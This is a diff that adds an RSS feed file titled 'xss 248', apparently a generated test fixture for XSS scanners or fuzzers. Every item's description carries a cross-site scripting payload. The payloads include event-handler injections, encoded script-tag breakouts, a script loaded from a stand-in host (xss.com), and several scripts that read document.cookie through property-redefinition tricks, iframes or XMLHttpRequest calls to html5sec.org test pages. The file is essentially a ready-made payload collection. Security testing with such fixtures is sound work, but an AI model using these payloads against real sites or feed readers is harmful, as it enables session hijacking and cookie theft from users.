@@ -1,0 +1,183 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0">
+<channel>
+  <title>xss 248</title>
+  <link>https://www.TDVMKLPYSKMLNDPIHKIV.com</link>
+  <description>ZGXDRCSLLKOUKUNQRZWI</description>
+  <item>
+    <title>FZWLIVFJZNJRFGJQLOJF</title>
+    <link>http://wwww.UZYMKEUNMLLNECWXRVFICFANVULRMIGXWCKALIEH.com</link>
+    <description>
+      <xss   onfocusin=alert(1)></xss>
+    </description>
+  </item>
+  <item>
+    <title>PNBMVGNROWLFQOVZEPLS</title>
+    <link>http://wwww.RSVHSRSACEREGVDPZASECJEDWBUZPBJRKSJANBFI.com</link>
+    <description>
+      <xss   onfocusout=alert(1)></xss><input autofocus>
+    </description>
+  </item>
+  <item>
+    <title>GNBBCWWNLXIIIGFBXSGF</title>
+    <link>http://wwww.CTRFSYZPBFWVUHQKCNQJHLKWWXAZCDHTFCSIOUUD.com</link>
+    <description>
+      '%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Eshadowlabs(0x000045)%3C/script%3E
+    </description>
+  </item>
+  <item>
+    <title>NFXEYHNINCGQBEHHSZGR</title>
+    <link>http://wwww.AFOUKQEMPHICYFIAVKTZNOUPKRMROUFTEDYRRRTP.com</link>
+    <description>
+      <<scr\0ipt/src=http://xss.com/xss.js></script
+    </description>
+  </item>
+  <item>
+    <title>IXXZMIZEBMSUJUBSNXGG</title>
+    <link>http://wwww.JECOBQQKTONRXEYVQCYBCERHZOUQBWVQBAHOBYOK.com</link>
+    <description>
+      %27%22--%3E%3C%2Fstyle%3E%3C%2Fscript%3E%3Cscript%3ERWAR%280x00010E%29%3C%2Fscript%3E
+    </description>
+  </item>
+  <item>
+    <title>VSBPEELJDLOUUAWHDTJY</title>
+    <link>http://wwww.AADPIBAGJIWYJWUJLWMRTIQPISYZIGPEJPPHWVEP.com</link>
+    <description>
+      ' onmouseover=alert(/XSS/)
+    </description>
+  </item>
+  <item>
+    <title>KHNZBTTGPDSQGVIJNVTM</title>
+    <link>http://wwww.NTERKHKVMOUJRLCHXETBOGZCTIQRCBYJMUQHCJNV.com</link>
+    <description>
+      "><iframe%20src="http://google.com"%%203E
+    </description>
+  </item>
+  <item>
+    <title>VHWPWDEICQRMKCHVIXTA</title>
+    <link>http://wwww.QFXBYOSWOCPBAFYXMZZWHZVTLKZHCAWNDVDRMOEB.com</link>
+    <description>
+      '<script>window.onload=function(){document.forms[0].message.value='1';}</script>
+    </description>
+  </item>
+  <item>
+    <title>VHAGJNAGIJRIMKSJGPWT</title>
+    <link>http://wwww.KNAVYNPXBHNWMVDYLIDHZEEUBNSARZHONRLTTSKH.com</link>
+    <description>
+      x”</title><img src%3dx onerror%3dalert(1)>
+    </description>
+  </item>
+  <item>
+    <title>DVGILFPNWAYFRITRQDXV</title>
+    <link>http://wwww.BWHOAXGHDNVCNCIATVNODGYSBRIWNIKMERGFSGRE.com</link>
+    <description>
+      <script> document.getElementById(%22safe123%22).setCapture(); document.getElementById(%22safe123%22).click(); </script>
+    </description>
+  </item>
+  <item>
+    <title>LHPUXMPRJYGNQUEMIORM</title>
+    <link>http://wwww.YFLDOHZXYYYHFKCQBZZKBBVLWUWWGBZAOYXVMMVU.com</link>
+    <description>
+      <script>Object.defineProperties(window, {Safe: {value: {get: function() {return document.cookie}}}});alert(Safe.get())</script>
+    </description>
+  </item>
+  <item>
+    <title>EITWGYADVMIRIGYFFWND</title>
+    <link>http://wwww.CIGURWBEKPQQQUDKFKZFZKHLTNTSQOMJCIHTLLOM.com</link>
+    <description>
+      <script>var x = document.createElement('iframe');document.body.appendChild(x);var xhr = x.contentWindow.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();</script>
+    </description>
+  </item>
+  <item>
+    <title>PRXXQZSBXXVOMAIOXNAK</title>
+    <link>http://wwww.PUHHDGSRVYDIZZBXHYPXAZBCJRQRBOPZICKYJXWF.com</link>
+    <description>
+      <script>(function() {var event = document.createEvent(%22MouseEvents%22);event.initMouseEvent(%22click%22, true, true, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null);var fakeData = [event, {isTrusted: true}, event];arguments.__defineGetter__('0', function() { return fakeData.pop(); });alert(Safe.get.apply(null, arguments));})();</script>
+    </description>
+  </item>
+  <item>
+    <title>BEJOZDFVBHZDIFIKTSPX</title>
+    <link>http://wwww.ODACBRHLGZKXCROITDGTPDEJIYLGTJEFIAVGGZHG.com</link>
+    <description>
+      <script>var script = document.getElementsByTagName('script')[0]; var clone = script.childNodes[0].cloneNode(true); var ta = document.createElement('textarea'); ta.appendChild(clone); alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>
+    </description>
+  </item>
+  <item>
+    <title>CIOXMHHTAAPPSVBXDNDE</title>
+    <link>http://wwww.MTFLXAAARAHMHLYHZEEHRUBLKEKZGRZBBUDVQHGE.com</link>
+    <description>
+      <script>xhr=new ActiveXObject(%22Msxml2.XMLHTTP%22);xhr.open(%22GET%22,%22/xssme2%22,true);xhr.onreadystatechange=function(){if(xhr.readyState==4%26%26xhr.status==200){alert(xhr.responseText.match(/'([^']%2b)/)[1])}};xhr.send();</script>
+    </description>
+  </item>
+  <item>
+    <title>SFDBETPPEJUIRDMXQNNX</title>
+    <link>http://wwww.TXQEEFSHUDPPHQWJOTQJBPMUPSOATZXQUOPBNNJZ.com</link>
+    <description>
+      <script>alert(document.documentElement.innerHTML.match(/'([^']%2b)/)[1])</script>
+    </description>
+  </item>
+  <item>
+    <title>HOLAHBIJPFKYAUGTZNUB</title>
+    <link>http://wwww.HFDMBRFDOBZKRPHSFZHVOAMVARIFHRQYRBRRKSQD.com</link>
+    <description>
+      <script>alert(document.getElementsByTagName('html')[0].innerHTML.match(/'([^']%2b)/)[1])</script>
+    </description>
+  </item>
+  <item>
+    <title>MJONKEZCDXZXBVIUQRMS</title>
+    <link>http://wwww.KERGAQVUQYJGDPMMJLAPNJQJPQVSEPOVCGFJFBWQ.com</link>
+    <description>
+      <%73%63%72%69%70%74> %64 = %64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74(%22%64%69%76%22); %64%2e%61%70%70%65%6e%64%43%68%69%6c%64(%64%6f%63%75%6d%65%6e%74%2e%68%65%61%64%2e%63%6c%6f%6e%65%4e%6f%64%65(%74%72%75%65)); %61%6c%65%72%74(%64%2e%69%6e%6e%65%72%48%54%4d%4c%2e%6d%61%74%63%68(%22%63%6f%6f%6b%69%65 = '(%2e%2a%3f)'%22)[%31]); </%73%63%72%69%70%74>
+    </description>
+  </item>
+  <item>
+    <title>OFHAFTDLXVQQKGNIRLHB</title>
+    <link>http://wwww.DTAWIOITSVYMSMRCMIMMGSASRSAOEQUPPORVSXBI.com</link>
+    <description>
+      <script> var xdr = new ActiveXObject(%22Microsoft.XMLHTTP%22);  xdr.open(%22get%22, %22/xssme2%3Fa=1%22, true); xdr.onreadystatechange = function() { try{   var c;   if (c=xdr.responseText.match(/document.cookie = '(.*%3F)'/) )    alert(c[1]); }catch(e){} };  xdr.send(); </script>
+    </description>
+  </item>
+  <item>
+    <title>DBQCRCJXRXLBVQVYXOCJ</title>
+    <link>http://wwww.ODSANYMZUBUHVFDZOFGXQMEAZLPAPZDQBSBXBYJY.com</link>
+    <description>
+      <iframe id=%22ifra%22 src=%22/%22></iframe> <script>ifr = document.getElementById('ifra'); ifr.contentDocument.write(%22<scr%22 %2b %22ipt>top.foo = Object.defineProperty</scr%22 %2b %22ipt>%22); foo(window, 'Safe', {value:{}}); foo(Safe, 'get', {value:function() {    return document.cookie }}); alert(Safe.get());</script>
+    </description>
+  </item>
+  <item>
+    <title>REQVQKHUKWDFQKTIGUUD</title>
+    <link>http://wwww.SDIURXAUYHSDMLJWQUILEGFOWRQBJHCWQLNJQUUM.com</link>
+    <description>
+      <script>alert(document.head.innerHTML.substr(146,20));</script>
+    </description>
+  </item>
+  <item>
+    <title>XAPQIFABMPYOEFDTDXPC</title>
+    <link>http://wwww.PCZODSMQTUQCVEIBYKXGYLATJDKKHQYHVNBBZRHN.com</link>
+    <description>
+      <script>alert(document.head.childNodes[3].text)</script>
+    </description>
+  </item>
+  <item>
+    <title>FCHCUJFPNHCAAUYCWDSK</title>
+    <link>http://wwww.DQDUUVILIWFCGQURVJMUJPVHOSDKQVIOCBMGAQZR.com</link>
+    <description>
+      <script>var request = new XMLHttpRequest();request.open('GET', 'http://html5sec.org/xssme2', false);request.send(null);if (request.status == 200){alert(request.responseText.substr(150,41));}</script>
+    </description>
+  </item>
+  <item>
+    <title>QMNLWGDDZMPZYFOFCNQM</title>
+    <link>http://wwww.BNAINTQBNWUAYBWJTNOCLNAYYVOMLEDHHVRGANNM.com</link>
+    <description>
+      <script>Object.defineProperty(window, 'Safe', {value:{}});Object.defineProperty(Safe, 'get', {value:function() {return document.cookie}});alert(Safe.get())</script>
+    </description>
+  </item>
+  <item>
+    <title>DCYILIPEYQTKPDHDTDPS</title>
+    <link>http://wwww.GFDFXJGCDISBDHQQZXMRWXJTDVQYVTZOMWMRGSRZ.com</link>
+    <description>
+      <script>x=document.createElement(%22iframe%22);x.src=%22http://xssme.html5sec.org/404%22;x.onload=function(){window.frames[0].document.write(%22<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%22)};document.body.appendChild(x);</script>
+    </description>
+  </item>
+</channel>
+</rss>
